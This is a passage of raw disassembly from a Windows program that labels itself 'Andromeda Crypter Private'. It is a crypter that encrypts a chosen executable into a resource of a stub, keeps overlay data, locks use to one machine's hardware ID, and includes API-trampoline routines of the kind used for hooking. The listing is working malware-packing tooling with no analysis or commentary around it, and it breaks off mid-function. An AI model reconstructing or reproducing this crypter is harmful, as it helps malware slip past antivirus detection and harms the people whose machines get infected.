loc_4027A6:				; CODE XREF: sub_4024F1+94j
		lea	edx, [ebp+Point]
		push	edx		; lpPoint
		call	ds:GetCursorPos
		lea	eax, [ebp+Rect]
		push	eax		; lpRect
		push	0		; nIDDlgItem
		mov	ecx, [ebp+hWnd]
		push	ecx		; hDlg
		call	ds:GetDlgItem
		push	eax		; hWnd
		call	ds:GetWindowRect
		mov	edx, [ebp+Point.y]
		push	edx
		mov	eax, [ebp+Point.x]
		push	eax		; pt
		lea	ecx, [ebp+Rect]
		push	ecx		; lprc
		call	ds:PtInRect
		test	eax, eax
		jz	short loc_4027F1
		push	7F89h		; lpCursorName
		push	0		; hInstance
		call	ds:LoadCursorA
		push	eax		; hCursor
		call	ds:SetCursor

loc_4027F1:				; CODE XREF: sub_4024F1+2EAj
		jmp	loc_402D27
; ---------------------------------------------------------------------------

loc_4027F6:				; CODE XREF: sub_4024F1+6Fj
		mov	edx, [ebp+arg_8]
		and	edx, 0FFFFh
		and	edx, 0FFFFh
		mov	[ebp+var_154], edx
		cmp	[ebp+var_154], 0
		jz	short loc_402819
		jmp	loc_402D27
; ---------------------------------------------------------------------------

loc_402819:				; CODE XREF: sub_4024F1+321j
		mov	byte_40EC38, 0
		xor	eax, eax
		test	eax, eax
		jz	short loc_40287D
		push	offset byte_40EC38
		call	sub_40103C
		add	esp, 4
		test	eax, eax
		jnz	short loc_402857
		push	10h		; uType
		push	offset aAndromedaCry_0 ; "Andromeda Crypter Private"
		push	offset aCouldNotLoad_0 ; "Could	not load file!"
		mov	ecx, [ebp+hWnd]
		push	ecx		; hWnd
		call	ds:MessageBoxA
		mov	eax, 1
		jmp	loc_402D29
; ---------------------------------------------------------------------------

loc_402857:				; CODE XREF: sub_4024F1+344j
		push	offset byte_40EC38 ; lpString
		push	0		; nIDDlgItem
		mov	edx, [ebp+hWnd]
		push	edx		; hDlg
		call	ds:SetDlgItemTextA
		push	1		; bEnable
		push	0		; nIDDlgItem
		mov	eax, [ebp+hWnd]
		push	eax		; hDlg
		call	ds:GetDlgItem
		push	eax		; hWnd
		call	ds:EnableWindow

loc_40287D:				; CODE XREF: sub_4024F1+333j
		jmp	loc_402D27
; ---------------------------------------------------------------------------

loc_402882:				; CODE XREF: sub_4024F1+3B7j
		mov	edx, [ebp+var_30]
		add	edx, 1
		mov	[ebp+var_30], edx
		cmp	[ebp+var_30], 0Fh
		jge	short loc_4028AA
		call	_rand
		cdq
		mov	ecx, 0FFh
		idiv	ecx
		add	edx, 1
		mov	eax, [ebp+var_30]
		mov	[ebp+eax+Data],	dl
		jmp	short loc_402882
; ---------------------------------------------------------------------------

loc_4028AA:				; CODE XREF: sub_4024F1+39Ej
		push	0		; hTemplateFile
		push	0		; dwFlagsAndAttributes
		push	2		; dwCreationDisposition
		push	0		; lpSecurityAttributes
		push	0		; dwShareMode
		push	40000000h	; dwDesiredAccess
		push	offset byte_40EC38 ; lpFileName
		call	ds:CreateFileA
		mov	[ebp+hObject], eax
		cmp	[ebp+hObject], 0FFFFFFFFh
		jnz	short loc_402907
		mov	ecx, [ebp+lpBuffer]
		push	ecx		; Memory
		call	_free
		add	esp, 4
		push	10h		; uType
		push	offset aAndromedaCrypt ; "Andromeda Crypter Private"
		push	offset aCouldNotCreate ; "Could	not create file!"
		mov	edx, [ebp+hWnd]
		push	edx		; hWnd
		call	ds:MessageBoxA
		push	1
		mov	eax, [ebp+hWnd]
		push	eax
		call	sub_401091
		add	esp, 8
		mov	eax, 1
		jmp	loc_402D29
; ---------------------------------------------------------------------------

loc_402907:				; CODE XREF: sub_4024F1+3DAj
		push	0		; lpOverlapped
		lea	ecx, [ebp+NumberOfBytesWritten]
		push	ecx		; lpNumberOfBytesWritten
		mov	edx, [ebp+nNumberOfBytesToWrite]
		push	edx		; nNumberOfBytesToWrite
		mov	eax, [ebp+lpBuffer]
		push	eax		; lpBuffer
		mov	ecx, [ebp+hObject]
		push	ecx		; hFile
		call	ds:WriteFile
		test	eax, eax
		jnz	short loc_402967
		mov	edx, [ebp+hObject]
		push	edx		; hObject
		call	ds:CloseHandle
		mov	eax, [ebp+lpBuffer]
		push	eax		; Memory
		call	_free
		add	esp, 4
		push	10h		; uType
		push	offset aAndromedaCry_1 ; "Andromeda Crypter Private"
		push	offset aCouldNotWriteT ; "Could	not write to file!"
		mov	ecx, [ebp+hWnd]
		push	ecx		; hWnd
		call	ds:MessageBoxA
		push	1
		mov	edx, [ebp+hWnd]
		push	edx
		call	sub_401091
		add	esp, 8
		mov	eax, 1
		jmp	loc_402D29
; ---------------------------------------------------------------------------

loc_402967:				; CODE XREF: sub_4024F1+430j
		mov	eax, [ebp+hObject]
		push	eax		; hObject
		call	ds:CloseHandle
		mov	ecx, [ebp+lpBuffer]
		push	ecx		; Memory
		call	_free
		add	esp, 4
		push	0		; nIDButton
		mov	edx, [ebp+hWnd]
		push	edx		; hDlg
		call	ds:IsDlgButtonChecked
		cmp	eax, 1
		jnz	short loc_4029D2
		push	offset byte_40EC38
		push	offset byte_40ED50
		call	sub_40102D
		add	esp, 8
		test	eax, eax
		jnz	short loc_4029D2
		push	10h		; uType
		push	offset aAndromedaCry_2 ; "Andromeda Crypter Private"
		push	offset aCouldNotAddIco ; "Could	not add	icon!"
		mov	eax, [ebp+hWnd]
		push	eax		; hWnd
		call	ds:MessageBoxA
		push	1
		mov	ecx, [ebp+hWnd]
		push	ecx
		call	sub_401091
		add	esp, 8
		mov	eax, 1
		jmp	loc_402D29
; ---------------------------------------------------------------------------

loc_4029D2:				; CODE XREF: sub_4024F1+49Bj
					; sub_4024F1+4B1j
		push	0		; bDeleteExistingResources
		push	offset byte_40EC38 ; pFileName
		call	ds:BeginUpdateResourceA
		mov	[ebp+hUpdate], eax
		cmp	[ebp+hUpdate], 0
		jnz	short loc_402A16
		push	10h		; uType
		push	offset aAndromedaCry_3 ; "Andromeda Crypter Private"
		push	offset aCouldNotAddRes ; "Could	not add	resource!"
		mov	edx, [ebp+hWnd]
		push	edx		; hWnd
		call	ds:MessageBoxA
		push	1
		mov	eax, [ebp+hWnd]
		push	eax
		call	sub_401091
		add	esp, 8
		mov	eax, 1
		jmp	loc_402D29
; ---------------------------------------------------------------------------

loc_402A16:				; CODE XREF: sub_4024F1+4F5j
		mov	ecx, nNumberOfBytesToRead
		push	ecx		; cb
		push	0Fh
		mov	edx, nNumberOfBytesToRead
		push	edx
		lea	eax, [ebp+Data]
		push	eax
		mov	ecx, lpBuffer
		push	ecx
		call	sub_40108C
		add	esp, 10h
		push	eax		; lpData
		push	0		; wLanguage
		push	5AADh		; lpName
		push	4		; lpType
		mov	edx, [ebp+hUpdate]
		push	edx		; hUpdate
		call	ds:UpdateResourceA
		test	eax, eax
		jnz	short loc_402A7F
		push	10h		; uType
		push	offset aAndromedaCry_4 ; "Andromeda Crypter Private"
		push	offset aCouldNotAddR_0 ; "Could	not add	resource!"
		mov	eax, [ebp+hWnd]
		push	eax		; hWnd
		call	ds:MessageBoxA
		push	1
		mov	ecx, [ebp+hWnd]
		push	ecx
		call	sub_401091
		add	esp, 8
		mov	eax, 1
		jmp	loc_402D29
; ---------------------------------------------------------------------------

loc_402A7F:				; CODE XREF: sub_4024F1+55Ej
		push	0Fh		; cb
		lea	edx, [ebp+Data]
		push	edx		; lpData
		push	0		; wLanguage
		push	152Dh		; lpName
		push	6		; lpType
		mov	eax, [ebp+hUpdate]
		push	eax		; hUpdate
		call	ds:UpdateResourceA
		test	eax, eax
		jnz	short loc_402ACA
		push	10h		; uType
		push	offset aAndromedaCry_5 ; "Andromeda Crypter Private"
		push	offset aCouldNotAddR_1 ; "Could	not add	resource!"
		mov	ecx, [ebp+hWnd]
		push	ecx		; hWnd
		call	ds:MessageBoxA
		push	1
		mov	edx, [ebp+hWnd]
		push	edx
		call	sub_401091
		add	esp, 8
		mov	eax, 1
		jmp	loc_402D29
; ---------------------------------------------------------------------------

loc_402ACA:				; CODE XREF: sub_4024F1+5A9j
		push	0Fh		; cb
		lea	eax, [ebp+Data]
		push	eax		; lpData
		push	0		; wLanguage
		push	152Dh		; lpName
		push	3		; lpType
		mov	ecx, [ebp+hUpdate]
		push	ecx		; hUpdate
		call	ds:UpdateResourceA
		test	eax, eax
		jnz	short loc_402B15
		push	10h		; uType
		push	offset aAndromedaCry_6 ; "Andromeda Crypter Private"
		push	offset aCouldNotAddR_2 ; "Could	not add	resource!"
		mov	edx, [ebp+hWnd]
		push	edx		; hWnd
		call	ds:MessageBoxA
		push	1
		mov	eax, [ebp+hWnd]
		push	eax
		call	sub_401091
		add	esp, 8
		mov	eax, 1
		jmp	loc_402D29
; ---------------------------------------------------------------------------

loc_402B15:				; CODE XREF: sub_4024F1+5F4j
		push	0Fh		; cb
		lea	ecx, [ebp+Data]
		push	ecx		; lpData
		push	0		; wLanguage
		push	152Eh		; lpName
		push	4		; lpType
		mov	edx, [ebp+hUpdate]
		push	edx		; hUpdate
		call	ds:UpdateResourceA
		test	eax, eax
		jnz	short loc_402B60
		push	10h		; uType
		push	offset aAndromedaCry_7 ; "Andromeda Crypter Private"
		push	offset aCouldNotAddR_3 ; "Could	not add	resource!"
		mov	eax, [ebp+hWnd]
		push	eax		; hWnd
		call	ds:MessageBoxA
		push	1
		mov	ecx, [ebp+hWnd]
		push	ecx
		call	sub_401091
		add	esp, 8
		mov	eax, 1
		jmp	loc_402D29
; ---------------------------------------------------------------------------

loc_402B60:				; CODE XREF: sub_4024F1+63Fj
		push	0		; fDiscard
		mov	edx, [ebp+hUpdate]
		push	edx		; hUpdate
		call	ds:EndUpdateResourceA
		test	eax, eax
		jnz	short loc_402B9E
		push	10h		; uType
		push	offset aAndromedaCry_8 ; "Andromeda Crypter Private"
		push	offset aCouldAddResour ; "Could	add resource!"
		mov	eax, [ebp+hWnd]
		push	eax		; hWnd
		call	ds:MessageBoxA
		push	1
		mov	ecx, [ebp+hWnd]
		push	ecx
		call	sub_401091
		add	esp, 8
		mov	eax, 1
		jmp	loc_402D29
; ---------------------------------------------------------------------------

loc_402B9E:				; CODE XREF: sub_4024F1+67Dj
		push	0Fh
		mov	edx, nNumberOfBytesToRead
		push	edx
		lea	eax, [ebp+Data]
		push	eax
		mov	ecx, lpBuffer
		push	ecx
		call	sub_40108C
		add	esp, 10h
		mov	edx, dword_40ED40
		mov	eax, [edx+3Ch]
		mov	ecx, dword_40ED48
		xor	edx, edx
		mov	dx, [ecx+6]
		sub	edx, 1
		imul	edx, 28h
		add	edx, lpBuffer
		lea	eax, [edx+eax+0F8h]
		mov	dword_40ED4C, eax
		mov	ecx, dword_40ED4C
		mov	edx, [ecx+14h]
		mov	eax, dword_40ED4C
		add	edx, [eax+10h]
		cmp	nNumberOfBytesToRead, edx
		jbe	loc_402D03
		push	0		; uType
		push	offset aAndromedaCry_9 ; "Andromeda Crypter Private"
		push	offset aEofDataFound ; "EOF data found!"
		mov	ecx, [ebp+hWnd]
		push	ecx		; hWnd
		call	ds:MessageBoxA
		push	0		; hTemplateFile
		push	0		; dwFlagsAndAttributes
		push	3		; dwCreationDisposition
		push	0		; lpSecurityAttributes
		push	0		; dwShareMode
		push	40000000h	; dwDesiredAccess
		push	offset byte_40EC38 ; lpFileName
		call	ds:CreateFileA
		mov	[ebp+hObject], eax
		cmp	[ebp+hObject], 0FFFFFFFFh
		jnz	short loc_402C6B
		push	10h		; uType
		push	offset aAndromedaCr_10 ; "Andromeda Crypter Private"
		push	offset aCouldNotOpenFi ; "Could	not open file!"
		mov	edx, [ebp+hWnd]
		push	edx		; hWnd
		call	ds:MessageBoxA
		push	1
		mov	eax, [ebp+hWnd]
		push	eax
		call	sub_401091
		add	esp, 8
		mov	eax, 1
		jmp	loc_402D29
; ---------------------------------------------------------------------------

loc_402C6B:				; CODE XREF: sub_4024F1+74Aj
		push	2		; dwMoveMethod
		push	0		; lpDistanceToMoveHigh
		push	0		; lDistanceToMove
		mov	ecx, [ebp+hObject]
		push	ecx		; hFile
		call	ds:SetFilePointer
		push	0		; lpOverlapped
		lea	edx, [ebp+NumberOfBytesWritten]
		push	edx		; lpNumberOfBytesWritten
		mov	eax, dword_40ED4C
		mov	ecx, [eax+14h]
		mov	edx, dword_40ED4C
		add	ecx, [edx+10h]
		mov	eax, nNumberOfBytesToRead
		sub	eax, ecx
		push	eax		; nNumberOfBytesToWrite
		mov	ecx, dword_40ED4C
		mov	edx, [ecx+14h]
		mov	eax, dword_40ED4C
		add	edx, [eax+10h]
		mov	ecx, lpBuffer
		lea	edx, [ecx+edx+1]
		push	edx		; lpBuffer
		mov	eax, [ebp+hObject]
		push	eax		; hFile
		call	ds:WriteFile
		test	eax, eax
		jnz	short loc_402CF9
		mov	ecx, [ebp+hObject]
		push	ecx		; hObject
		call	ds:CloseHandle
		push	10h		; uType
		push	offset aAndromedaCr_11 ; "Andromeda Crypter Private"
		push	offset aCouldNotWrit_0 ; "Could	not write to file!"
		mov	edx, [ebp+hWnd]
		push	edx		; hWnd
		call	ds:MessageBoxA
		push	1
		mov	eax, [ebp+hWnd]
		push	eax
		call	sub_401091
		add	esp, 8
		mov	eax, 1
		jmp	short loc_402D29
; ---------------------------------------------------------------------------

loc_402CF9:				; CODE XREF: sub_4024F1+7D1j
		mov	ecx, [ebp+hObject]
		push	ecx		; hObject
		call	ds:CloseHandle

loc_402D03:				; CODE XREF: sub_4024F1+70Dj
		push	40h		; uType
		push	offset aAndromedaCr_12 ; "Andromeda Crypter Private"
		push	offset aFileSuccessful ; "File successfully crypted!"
		mov	edx, [ebp+hWnd]
		push	edx		; hWnd
		call	ds:MessageBoxA
		push	1
		mov	eax, [ebp+hWnd]
		push	eax
		call	sub_401091
		add	esp, 8

loc_402D27:				; CODE XREF: sub_4024F1+60j
					; sub_4024F1+75j ...
		xor	eax, eax

loc_402D29:				; CODE XREF: sub_4024F1+1CBj
					; sub_4024F1+361j ...
		mov	esp, ebp
		pop	ebp
		retn	10h
sub_4024F1	endp

; ---------------------------------------------------------------------------

loc_402D2F:				; CODE XREF: .text:00401078j
		push	ebp
		mov	ebp, esp
		sub	esp, 10Ch
		push	offset aM_aerocrypter ;	"m_Aerocrypter"
		push	0
		push	1F0001h
		call	ds:OpenMutexA
		mov	[ebp-10Ch], eax
		cmp	dword ptr [ebp-10Ch], 0
		jnz	short loc_402D70
		push	offset aM_aerocrypte_0 ; "m_Aerocrypter"
		push	0
		push	0
		call	ds:CreateMutexA
		mov	[ebp-10Ch], eax
		jmp	short loc_402D77
; ---------------------------------------------------------------------------

loc_402D70:				; CODE XREF: .text:00402D57j
		xor	eax, eax
		jmp	loc_402E3F
; ---------------------------------------------------------------------------

loc_402D77:				; CODE XREF: .text:00402D6Ej
		push	104h
		lea	eax, [ebp-104h]
		push	eax
		push	offset aHomedrive ; "HOMEDRIVE"
		call	ds:GetEnvironmentVariableA
		push	offset asc_40E37C ; "\\"
		lea	ecx, [ebp-104h]
		push	ecx
		call	_strcat
		add	esp, 8
		push	0
		push	0
		push	0
		push	0
		lea	edx, [ebp-108h]
		push	edx
		push	0
		push	0
		lea	eax, [ebp-104h]
		push	eax
		call	ds:GetVolumeInformationA
		test	eax, eax
		jnz	short loc_402DE1
		push	0
		push	offset aHwid	; "HWID"
		push	offset aCannotGetTheHw ; "Cannot get the HWID"
		push	0
		call	ds:MessageBoxA
		mov	eax, 1
		jmp	short loc_402E3F
; ---------------------------------------------------------------------------

loc_402DE1:				; CODE XREF: .text:00402DC4j
		cmp	dword ptr [ebp-108h], 0A4DEF035h
		jnz	short loc_402E26
		push	0
		push	offset aThankYou ; "Thank You "
		push	offset aHardwareIdChec ; "Hardware ID checked!.	Acces Granted"
		push	0
		call	ds:MessageBoxA
		mov	ecx, [ebp+8]
		mov	hInstance, ecx
		push	0
		push	offset sub_40106E
		push	0
		push	0
		mov	edx, hInstance
		push	edx
		call	ds:DialogBoxParamA
		xor	eax, eax
		jmp	short loc_402E3F
; ---------------------------------------------------------------------------

loc_402E26:				; CODE XREF: .text:00402DEBj
		push	0
		push	offset aAccessDenied ; "Access DENIED"
		push	offset aHardwareIdCh_0 ; "Hardware ID checked, Acces DENIED! If	y"...
		push	0
		call	ds:MessageBoxA
		mov	eax, 1

loc_402E3F:				; CODE XREF: .text:00402D72j
					; .text:00402DDFj ...
		mov	esp, ebp
		pop	ebp
		retn	10h
; ---------------------------------------------------------------------------
		db 70Bh	dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_403550(LPCSTR lpProcName, LPCSTR lpLibFileName, size_t Size)
sub_403550	proc near		; CODE XREF: sub_401019j

var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
Src		= dword	ptr -0Ch
dwSize		= dword	ptr -8
flOldProtect	= dword	ptr -4
lpProcName	= dword	ptr  8
lpLibFileName	= dword	ptr  0Ch
Size		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		sub	esp, 14h
		mov	[ebp+var_14], ecx
		mov	eax, [ebp+Size]
		add	eax, 5
		mov	[ebp+dwSize], eax
		mov	ecx, [ebp+dwSize]
		push	ecx		; unsigned int
		call	??2@YAPAXI@Z	; operator new(uint)
		add	esp, 4
		mov	[ebp+var_10], eax
		mov	edx, [ebp+var_14]
		mov	eax, [ebp+var_10]
		mov	[edx], eax
		lea	ecx, [ebp+flOldProtect]
		push	ecx		; lpflOldProtect
		push	40h		; flNewProtect
		mov	edx, [ebp+dwSize]
		push	edx		; dwSize
		mov	eax, [ebp+var_14]
		mov	ecx, [eax]
		push	ecx		; lpAddress
		call	ds:VirtualProtect
		mov	edx, [ebp+lpProcName]
		push	edx		; lpProcName
		mov	eax, [ebp+lpLibFileName]
		push	eax		; lpLibFileName
		call	ds:LoadLibraryA
		push	eax		; hModule
		call	ds:GetProcAddress
		mov	[ebp+Src], eax
		mov	ecx, [ebp+Size]
		push	ecx		; Size
		mov	edx, [ebp+Src]
		push	edx		; Src
		mov	eax, [ebp+var_14]
		mov	ecx, [eax]
		push	ecx		; Dst
		call	_memcpy
		add	esp, 0Ch
		mov	edx, [ebp+var_14]
		mov	eax, [edx]
		add	eax, [ebp+Size]
		mov	ecx, [ebp+var_14]
		mov	[ecx], eax
		mov	edx, [ebp+var_14]
		mov	eax, [edx]
		mov	byte ptr [eax],	0E9h
		mov	ecx, [ebp+var_14]
		mov	edx, [ecx]
		add	edx, 1
		mov	eax, [ebp+var_14]
		mov	[eax], edx
		mov	ecx, [ebp+var_14]
		mov	edx, [ebp+Src]
		sub	edx, [ecx]
		mov	eax, [ebp+Size]
		lea	ecx, [edx+eax-4]
		mov	edx, [ebp+var_14]
		mov	eax, [edx]
		mov	[eax], ecx
		mov	ecx, [ebp+Size]
		add	ecx, 1
		mov	edx, [ebp+var_14]
		mov	eax, [edx]
		sub	eax, ecx
		mov	ecx, [ebp+var_14]
		mov	[ecx], eax
		mov	eax, [ebp+var_14]
		mov	esp, ebp
		pop	ebp
		retn	0Ch
sub_403550	endp

; ---------------------------------------------------------------------------
		db 30h dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_403640	proc near		; CODE XREF: sub_401046j

var_8		= dword	ptr -8
Memory		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		sub	esp, 8
		mov	[ebp+var_8], ecx
		mov	eax, [ebp+var_8]
		mov	ecx, [eax]
		mov	[ebp+Memory], ecx
		mov	edx, [ebp+Memory]
		push	edx		; Memory
		call	??3@YAXPAX@Z	; operator delete(void *)
		add	esp, 4
		mov	esp, ebp
		pop	ebp
		retn
sub_403640	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_403670(LPCSTR lpProcName, LPCSTR lpLibFileName, size_t Size)
sub_403670	proc near		; CODE XREF: sub_401032j

var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
Src		= dword	ptr -0Ch
dwSize		= dword	ptr -8
flOldProtect	= dword	ptr -4
lpProcName	= dword	ptr  8
lpLibFileName	= dword	ptr  0Ch
Size		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		sub	esp, 14h
		mov	[ebp+var_14], ecx
		mov	eax, [ebp+Size]
		add	eax, 5
		mov	[ebp+dwSize], eax
		mov	ecx, [ebp+dwSize]
		push	ecx		; unsigned int
		call	??2@YAPAXI@Z	; operator new(uint)
		add	esp, 4
		mov	[ebp+var_10], eax
		mov	edx, [ebp+var_14]
		mov	eax, [ebp+var_10]
		mov	[edx], eax
		lea	ecx, [ebp+flOldProtect]
		push	ecx		; lpflOldProtect
		push	40h		; flNewProtect
		mov	edx, [ebp+dwSize]
		push	edx		; dwSize
		mov	eax, [ebp+var_14]
		mov	ecx, [eax]
		push	ecx		; lpAddress
		call	ds:VirtualProtect
		mov	edx, [ebp+lpProcName]
		push	edx		; lpProcName
		mov	eax, [ebp+lpLibFileName]
		push	eax		; lpLibFileName
		call	ds:LoadLibraryA
		push	eax		; hModule
		call	ds:GetProcAddress
		mov	[ebp+Src], eax
		mov	ecx, [ebp+Size]
		push	ecx		; Size
		mov	edx, [ebp+Src]
		push	edx		; Src
		mov	eax, [ebp+var_14]
		mov	ecx, [eax]
		push	ecx		; Dst
		call	_memcpy
		add	esp, 0Ch
		mov	edx, [ebp+var_14]
		mov	eax, [edx]
		add	eax, [ebp+Size]
		mov	ecx, [ebp+var_14]
		mov	[ecx], eax
		mov	edx, [ebp+var_14]
		mov	eax, [edx]
		mov	byte ptr [eax],	0E9h
		mov	ecx, [ebp+var_14]
		mov	edx, [ecx]
		add	edx, 1
		mov	eax, [ebp+var_14]
		mov	[eax], edx
		mov	ecx, [ebp+var_14]
		mov	edx, [ebp+Src]
		sub	edx, [ecx]
		mov	eax, [ebp+Size]
		lea	ecx, [edx+eax-4]
		mov	edx, [ebp+var_14]
		mov	eax, [edx]
		mov	[eax], ecx
		mov	ecx, [ebp+Size]
		add	ecx, 1
		mov	edx, [ebp+var_14]
		mov	eax, [edx]
		sub	eax, ecx
		mov	ecx, [ebp+var_14]
		mov	[ecx], eax
		mov	eax, [ebp+var_14]
		mov	esp, ebp
		pop	ebp
		retn	0Ch
sub_403670	endp

; ---------------------------------------------------------------------------
		db 30h dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_403760	proc near		; CODE XREF: sub_401028j

var_8		= dword	ptr -8
Memory		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		sub	esp, 8
		mov	[ebp+var_8], ecx
		mov	eax, [ebp+var_8]
		mov	ecx, [eax]
		mov	[ebp+Memory], ecx
		mov	edx, [ebp+Memory]
		push	edx		; Memory
		call	??3@YAXPAX@Z	; operator delete(void *)
		add	esp, 4
		mov	esp, ebp
		pop	ebp
		retn
sub_403760	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_403790(LPCSTR lpProcName, LPCSTR lpLibFileName, size_t Size)
sub_403790	proc near		; CODE XREF: sub_401087j

var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
Src		= dword	ptr -0Ch
dwSize		= dword	ptr -8
flOldProtect	= dword	ptr -4
lpProcName	= dword	ptr  8
lpLibFileName	= dword	ptr  0Ch
Size		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		sub	esp, 14h
		mov	[ebp+var_14], ecx
		mov	eax, [ebp+Size]
		add	eax, 5
		mov	[ebp+dwSize], eax
		mov	ecx, [ebp+dwSize]
		push	ecx		; unsigned int
		call	??2@YAPAXI@Z	; operator new(uint)
		add	esp, 4
		mov	[ebp+var_10], eax
		mov	edx, [ebp+var_14]
		mov	eax, [ebp+var_10]
		mov	[edx], eax
		lea	ecx, [ebp+flOldProtect]
		push	ecx		; lpflOldProtect
		push	40h		; flNewProtect
		mov	edx, [ebp+dwSize]
		push	edx		; dwSize
		mov	eax, [ebp+var_14]
		mov	ecx, [eax]
		push	ecx		; lpAddress
		call	ds:VirtualProtect
		mov	edx, [ebp+lpProcName]
		push	edx		; lpProcName
		mov	eax, [ebp+lpLibFileName]
		push	eax		; lpLibFileName
		call	ds:LoadLibraryA
		push	eax		; hModule
		call	ds:GetProcAddress
		mov	[ebp+Src], eax
		mov	ecx, [ebp+Size]
		push	ecx		; Size
		mov	edx, [ebp+Src]
		push	edx		; Src
		mov	eax, [ebp+var_14]
		mov	ecx, [eax]
		push	ecx		; Dst
		call	_memcpy
		add	esp, 0Ch
		mov	edx, [ebp+var_14]
		mov	eax, [edx]
		add	eax, [ebp+Size]
		mov	ecx, [ebp+var_14]
		mov	[ecx], eax
		mov	edx, [ebp+var_14]
		mov	eax, [edx]
		mov	byte ptr [eax],	0E9h
		mov	ecx, [ebp+var_14]
		mov	edx, [ecx]
		add	edx, 1
		mov	eax, [ebp+var_14]
		mov	[eax], edx
		mov	ecx, [ebp+var_14]
		mov	edx, [ebp+Src]
		sub	edx, [ecx]
		mov	eax, [ebp+Size]
		lea	ecx, [edx+eax-4]
		mov	edx, [ebp+var_14]
		mov	eax, [edx]
		mov	[eax], ecx
		mov	ecx, [ebp+Size]
		add	ecx, 1
		mov	edx, [ebp+var_14]
		mov	eax, [edx]
		sub	eax, ecx
		mov	ecx, [ebp+var_14]
		mov	[ecx], eax
		mov	eax, [ebp+var_14]
		mov	esp, ebp
		pop	ebp
		retn	0Ch
sub_403790	endp

; ---------------------------------------------------------------------------
		db 30h dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_403880	proc near		; CODE XREF: sub_401073j

var_8		= dword	ptr -8
Memory		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		sub	esp, 8
		mov	[ebp+var_8], ecx
		mov	eax, [ebp+var_8]
		mov	ecx, [eax]
		mov	[ebp+Memory], ecx
		mov	edx, [ebp+Memory]
		push	edx		; Memory
		call	??3@YAXPAX@Z	; operator delete(void *)
		add	esp, 4
		mov	esp, ebp
		pop	ebp
		retn
sub_403880	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4038B0	proc near		; CODE XREF: sub_40105Fj

Memory		= dword	ptr -24h
var_20		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= byte ptr  10h

		push	ebp
		mov	ebp, esp
		sub	esp, 24h
		push	ebx
		push	esi
		push	edi
		mov	eax, [ebp+arg_4]
		shl	eax, 2
		push	eax		; unsigned int
		call	??2@YAPAXI@Z	; operator new(uint)
		add	esp, 4
		mov	[ebp+var_20], eax
		mov	ecx, [ebp+var_20]
		mov	[ebp+var_10], ecx
		lea	edx, [ebp+arg_8]
		mov	[ebp+var_8], edx
		mov	[ebp+var_18], 0
		jmp	short loc_4038E9
; ---------------------------------------------------------------------------

loc_4038E0:				; CODE XREF: sub_4038B0+59j
		mov	eax, [ebp+var_18]
		add	eax, 1
		mov	[ebp+var_18], eax

loc_4038E9:				; CODE XREF: sub_4038B0+2Ej
		mov	ecx, [ebp+var_18]
		cmp	ecx, [ebp+arg_4]
		jge	short loc_40390B
		mov	edx, [ebp+var_8]
		add	edx, 4
		mov	[ebp+var_8], edx
		mov	eax, [ebp+var_18]
		mov	ecx, [ebp+var_10]
		mov	edx, [ebp+var_8]
		mov	edx, [edx-4]
		mov	[ecx+eax*4], edx
		jmp	short loc_4038E0
; ---------------------------------------------------------------------------

loc_40390B:				; CODE XREF: sub_4038B0+3Fj
		mov	eax, [ebp+arg_4]
		sub	eax, 1
		mov	[ebp+var_14], eax
		jmp	short loc_40391F
; ---------------------------------------------------------------------------

loc_403916:				; CODE XREF: sub_4038B0+86j
		mov	ecx, [ebp+var_14]
		sub	ecx, 1
		mov	[ebp+var_14], ecx

loc_40391F:				; CODE XREF: sub_4038B0+64j
		cmp	[ebp+var_14], 0
		jl	short loc_403938
		mov	edx, [ebp+var_14]
		shl	edx, 2
		mov	[ebp+var_1C], edx
		mov	eax, [ebp+var_10]
		add	eax, [ebp+var_1C]
		push	dword ptr [eax]
		jmp	short loc_403916
; ---------------------------------------------------------------------------

loc_403938:				; CODE XREF: sub_4038B0+73j
		mov	eax, [ebp+arg_0]
		mov	ecx, [eax]
		mov	[ebp+var_4], ecx
		mov	eax, [ebp+var_4]
		call	eax
		mov	[ebp+var_C], eax
		mov	edx, [ebp+var_10]
		mov	[ebp+Memory], edx
		mov	eax, [ebp+Memory]
		push	eax		; Memory
		call	??3@YAXPAX@Z	; operator delete(void *)
		add	esp, 4
		mov	[ebp+var_8], 0
		mov	eax, [ebp+var_C]
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_4038B0	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 35h dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_4039A0(LPCSTR lpProcName, LPCSTR lpLibFileName, size_t Size)
sub_4039A0	proc near		; CODE XREF: sub_401055j

var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
Src		= dword	ptr -0Ch
dwSize		= dword	ptr -8
flOldProtect	= dword	ptr -4
lpProcName	= dword	ptr  8
lpLibFileName	= dword	ptr  0Ch
Size		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		sub	esp, 14h
		mov	[ebp+var_14], ecx
		mov	eax, [ebp+Size]
		add	eax, 5
		mov	[ebp+dwSize], eax
		mov	ecx, [ebp+dwSize]
		push	ecx		; unsigned int
		call	??2@YAPAXI@Z	; operator new(uint)
